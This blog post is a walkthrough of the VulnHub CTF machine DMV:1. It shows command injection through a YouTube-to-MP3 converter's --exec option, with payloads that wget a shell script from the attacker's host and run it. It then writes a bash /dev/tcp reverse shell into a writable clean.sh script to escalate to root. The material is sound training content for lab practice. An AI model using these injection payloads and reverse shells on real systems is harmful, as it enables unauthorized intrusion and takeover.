<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">DMV :1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/dmv-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-08-25T17:34:41+00:00">August 25, 2020</time><time class="updated" datetime="2025-06-10T20:10:14+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">CTF’s are one of the best and probably the fun way to get hands-on pen testing experience. This one, in particular, is a great CTF from Vulnhub which uses aspects of web penetration testing like file upload attacks. We get a chance to capture the requests being made from the web application and exploiting them to get into our victim machine.</span></p>
<p><span style="color: #000000;">It is of intermediate level difficulty, so there could be a few places where you could be stuck and the next step in the process won’t come naturally and will require a bit of manual searching.</span></p>
<p><span style="color: #000000;">You can download the this CTF from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/dmv-1,462/">here</a></strong></span>.</span></p>
<p><span style="color: #000000;">So, let’s get you started!!</span></p>
<h3><span style="color: #800000;"><strong>Reconnaissance</strong></span></h3>
<p><span style="color: #000000;">To find the victim machine which has the CTF lab running on, we can start with using</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QNT-vQZUa40/X0VCmY8w69I/AAAAAAAAnoM/niu5ouiOrbgGGajlHSTdMmN4rBD1xrIfACLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">We have deduced in the previous step, that the victim IP is <strong>192.168.1.105</strong></span></p>
<p><span style="color: #000000;">Let’s start with scanning the IP and see what we could be found. An <strong>Aggressive(A)</strong> nmap scan can help us get an idea of what all the ports and services running on the CTF machine.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.105</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xNz_TbXo-6k/X0VDfU6YQII/AAAAAAAAnoU/ZpOJHDVqg2Asp0IwwlLnwNIunnVVInf7ACLcBGAsYHQ/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">In the previous step, we saw that Port 80 is open and running an Apache server. To enumerate, let us open the web browser, and enter the IP of the victim machine in the URL section and see what we can find.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-X30SQ99u4M0/X0VDoKUfcbI/AAAAAAAAnoY/MQl49E6Zf_w6bOnvyK9RuNvAAhrRj_7XwCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Well, now in the image below we are going to see something interesting. So here we see that this web application can be used to convert YouTube videos to MP3 format. Let’s see what is under the hood. </span><span style="color: #000000;">Burpsuite is the tool of choice here, so let’s start burp proxy.</span></p>
<p><span style="color: #000000;">We are now ready to capture the requests coming from this web application for analysis. After pasting a random YouTube URL in the test box, we hit the convert button. </span><span style="color: #000000;">Click on the intercept, and turn it on.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NttGuPnjN8k/X0VDvF4Rl9I/AAAAAAAAnoc/sU-bhEY346QoQg7zi5pNaazMYSjueDn6gCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">To see the response we will release this request.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Oln5SDguTpg/X0VD3QKpzVI/AAAAAAAAnog/tjyeu0JaKYYiQmPhIt02J3DnohRp-x45QCLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We seem to be getting an error, that is curious, let’s try to find out what this error means and what it leads us to. </span><span style="color: #000000;">We copy and error and paste it in google to see what results in we get for it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LZy_f5Vudrw/X0VEAL7VOzI/AAAAAAAAnos/W0CASkGPi3sO_k5EjBPCtA0TnKxUavQeACLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Here we get a Github <span style="color: #0000ff;"><strong>link</strong></span>. </span><span style="color: #000000;">On examining the Github link, we come across options on what command handles can be accepted by this web application.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ycSEATwddd0/X0VEJPmD_aI/AAAAAAAAno0/YJ5RZCzx3bs_TJ1s7sxTowOGj0ExFg4sQCLcBGAsYHQ/s1600/7.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">There’s an option here that can be used in the web application to run a command</span></p>
<p><span style="color: #000000;">We will now do the request capture again and modify an argument that is captured. Using the “–exec’” option to run a command to see what files we can find.</span></p>
<pre class="lang:default decode:true">--exec%3c'ls${IFS}-la'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WUzVlLHXoMA/X0VERdknLEI/AAAAAAAAno8/P2cTUznx16sQ4FUE6ioPZMJx5wuzxg9cwCLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">As a result, we can see <strong>index.php</strong> and its permissions for the present user.</span></p>
<p><span style="color: #000000;">The next step is to make a shell file with Python. Feel free to pick your favourite Python reverse shellcode, just be sure to change the IP and the port of the shell to your attacking machine as we have done below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DCwp8kUtQzk/X0VEazIsoqI/AAAAAAAAnpE/2th3VxlRlacffXonmhFJQ5N3LANk7IiywCLcBGAsYHQ/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Our file is made, and we have turned on the python server on our attacking machine to host the shell file that we just made.</span></p>
<p><span style="color: #000000;">In Burpsuite we can do a request capture again and modify it for the victim machine to upload our shell file using the same command that we used last time to run a query on the victim machine, coupled with wget.</span></p>
<pre class="lang:default decode:true">--exec%3c'wget${IFS}http://192.168.1.112:8000/file.sh'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AVrzBCbJ13Q/X0VEi16NvFI/AAAAAAAAnpM/L2MJTjQL9ecFofhoyDH3YTzH0k48JL0agCLcBGAsYHQ/s1600/10.png"/></span></p>
<p><span style="color: #000000;">The operation is successful, our Python shell file has been successfully uploaded to the victim machine.</span></p>
<p><span style="color: #000000;">To validate what we have done, we use the <strong>ls -la </strong>command.</span></p>
<pre class="lang:default decode:true">--exec%3c'ls${IFS}-la'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FqrJlDTwf6I/X0VEpt_pjfI/AAAAAAAAnpQ/HeQT7kkwfCsEOkvkqyDZSfv0p6PZTsVDwCLcBGAsYHQ/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Our shell file is in the victim system ready and waiting to be executed, so let’s go ahead and get it going.</span></p>
<pre class="lang:default decode:true">yt_url=--exec%3c`bash${IFS}file.sh`</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uhhWYe1DpqY/X0VEy_OrQ9I/AAAAAAAAnpc/cgG5Hxdye5QjZWGVeJFxZi2PbeCm1sEqgCLcBGAsYHQ/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Our <strong>Netcat </strong>listener is ready and waiting for the reverse shell to call back to the attacking machine. </span><span style="color: #000000;">We have a shell! Let’s explore the directories. </span><span style="color: #000000;">We come across a directory named “<strong>admin</strong>”, lets shift to it and look inside. We can see that there is a file named <strong>“flag.txt</strong>” here, on opening it we get our first flag. </span><span style="color: #000000;">The next thing to do will be to find files which are writeable and will take our input so that we can get to a state of higher privilege.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234
ls
cd admin
ls
cat flag.txt
find / -writeable -type d 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BSZTgIgGW6k/X0VE7rFxlaI/AAAAAAAAnpg/v2Ks9YEZkkwNA26AGAN1tcNBjPvxwtgRACLcBGAsYHQ/s1600/13.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">We find a directory named “<strong>tmp</strong>” that we can write to. </span><span style="color: #000000;">On digging into “tmp” and listing all hidden files, we find that there is a shell file named “<strong>clean.sh</strong>”, we can now write our shellcode to this file and use it to get a shell with higher privileges. </span><span style="color: #000000;">Using echo, we put our shellcode into the file.</span></p>
<pre class="lang:default decode:true">cd tmp
ls -la
echo "bash -i &gt;&amp; /dev/tcp/192.168.1.112/8888 0&gt;&amp;1" &gt; clean.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5pWTdXt2EgI/X0VFDW-mSUI/AAAAAAAAnpo/sOc2cOvOsckkI_PpMrAXyL0GLpjllGf5gCLcBGAsYHQ/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Now switch on Netcat listener and wait. This step requires a bit of patience as it can take up to a minute for the shell to call back to the attacking machine.</span></p>
<pre class="lang:default decode:true">nc -lvp 8888
cd /root
ls
cat root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-98BYHK3mTJM/X0VFKSsFu2I/AAAAAAAAnps/bJ_LBD-7ImMDoYgnDzmENYDb2PRbwZhiwCLcBGAsYHQ/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Success! We’re in!</span></p>
<p><span style="color: #000000;">On exploring the root directory, we find a file named “<strong>root.txt</strong>”, we open it to find the final flag. </span><span style="color: #000000;">This ends out a walkthrough of DMV:1. </span><span style="color: #000000;">As always, we at hacking articles will try to get you latest and greatest in the sphere of infosec. </span><span style="color: #000000;">Have fun and stay ethical.</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Jeenali Kothari is a Digital Forensics enthusiast and enjoys technical content writing. You can reach her on<strong><a style="color: #000000;" href="https://www.linkedin.com/in/jeenali-kothari"> <span style="color: #0000ff;">Here</span></a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
